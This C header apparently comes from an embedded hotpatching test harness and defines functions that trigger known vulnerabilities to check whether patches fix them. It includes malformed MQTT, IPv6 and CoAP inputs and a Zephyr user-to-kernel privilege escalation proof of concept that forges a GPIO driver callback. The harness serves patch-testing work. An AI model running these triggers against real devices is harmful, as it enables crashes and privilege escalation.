#ifndef CVE_TRIGGER_H_
#define CVE_TRIGGER_H_
#include "hotpatch/include/utils.h"
#include "hotpatch/include/profiling.h"
#include "dummy_cve.h"
#include "hotpatch/include/fixed_patch_points.h"

typedef void (*trigger_func)(void);

extern int test_dynamic_bug(int val);

static void this_is_cve_trigger_func(void) {
	DEBUG_LOG("run test_func: 0x%08x\n", (uint32_t) test_dynamic_bug);
	int eid = profile_add_event("dummy cve start");
	int inputs[] = {4500, 2000};
	profile_start(0);
	int v = test_dynamic_bug(inputs[0]);
	profile_end(0);
	profile_dump(0);
	DEBUG_LOG("is bug fixed? %s\n", v == 0 ? "yes": "no");
}


// dummy_cve dynamic_patch_dummy_cve1
static void trigger_dummy_cve1() {
	// setup test arguments
	DEBUG_LOG("run dynamic_patch_dummy_cve1 func at addr:0x%08x\n", dynamic_patch_dummy_cve1);
	
	uint8_t packet_buf[10];
	
	for (int i=0; i<4; ++i) packet_buf[i] = 0xff;
	packet_buf[4] = 0x7f;
	for (int i=5; i<10; ++i) packet_buf[i] = 0;

	struct dummy_MQTT_buf_ctx dbc;
	dbc.cur = &packet_buf[0];
	dbc.end = &packet_buf[9];	

	uint32_t pkt_length = 0;
	
	profile_start(0);
	int ret = dynamic_patch_dummy_cve1(&dbc, &pkt_length);
	profile_end(0);

	DEBUG_LOG("Decoded MQTT packet length is %d\n", pkt_length);

	if (pkt_length != 0) {
		DEBUG_LOG("The buggy function is still vulnerable!\n");
	} else {
		DEBUG_LOG("The buggy function is fixed!\n");
	}
}


// trigger 
// hotpatch\include\dynamic_patch_dummy_cve.h
/*
unbounded loop: CVE_2020_17445_pico_ipv6_process_destopt
*/
static void trigger_dummy_cve2(void) {
	DEBUG_LOG("run dynamic_patch_dummy_cve2 func at addr: 0x%08x\n", (uint32_t) dynamic_patch_dummy_cve2);
	uint32_t opt_ptr = 0;
	uint8_t destopt[50] = {1, 1, -2, -2, -2, -2, -2};
	
	profile_start(0);
	int ret = dynamic_patch_dummy_cve2(destopt, 0, opt_ptr);
	profile_end(0);

	DEBUG_LOG("Exit loop. The return code of the buggy function is %d\n", ret);
}


#ifdef ZEPHYR_OS
#include <zephyr.h>
#include <misc/printk.h>
#include <net/coap.h>
#include <gpio.h>

static void zephyr_cve_2020_10063(void)
{
	unsigned char testcase[] = {
		0, 0, 0, 0,
		0x0E, /* delta=0, length=14 */ // COAP_OPTION_EXT_14 = 14
		0xFE, 0xF0, /* First option */
		0x00 /* More data following the option to skip the "if (r == 0) {" case */
	};
	testcase[5] = testcase[6] = 1;
	DEBUG_LOG("vul func addr: 0x%08x\n", coap_packet_parse);
	struct coap_packet pkt;
	int ret;
	int eid = profile_add_event("coap start");
	profile_start(EV0);
	profile_end(EV0);
	ret = coap_packet_parse(&pkt, testcase, sizeof(testcase), NULL, 0);
	//profile_end(eid);
	profile_dump(EV0);
	profile_dump(EV1);
	DEBUG_LOG("ret = %d\n", ret);
}

static void print_control(const char *s) {
	uint32_t control;
	__asm__ volatile ("mrs %0, CONTROL" : "=r"(control));
	printk("%s - CONTROL: 0x%X\n", s, control);
}

static void escalate(void) {
	print_control("escalated");
	// while (1) {}
}

static void mqtt_cve_10062() {
	
}

static void user(void *p1, void *p2, void *p3) {
	struct gpio_driver_api api;
	struct device port;
	print_control("user");
	api.enable_callback = (void*)escalate;
	port.driver_api = &api;
	gpio_enable_callback(&port, 0, 0);
}

static void zephyr_cve_2020_10028(void) {
	print_control("kernel");
	k_thread_user_mode_enter(user, NULL, NULL, NULL);
}

trigger_func dynamic_trigger_func_list[] = {
	this_is_cve_trigger_func,
	zephyr_cve_2020_10063,
	zephyr_cve_2020_10028,
};

// Fixed Patch point


trigger_func fixed_trigger_func_list[] = {
	test_fixed_patch_point,
};


#else

trigger_func dynamic_trigger_func_list[] = {
	this_is_cve_trigger_func,
	trigger_dummy_cve1,
	trigger_dummy_cve2,
};

trigger_func fixed_trigger_func_list[] = {
	test_fixed_patch_point,
};

#endif // ZEPHYR_OS

#endif // CVE_TRIGGER_H_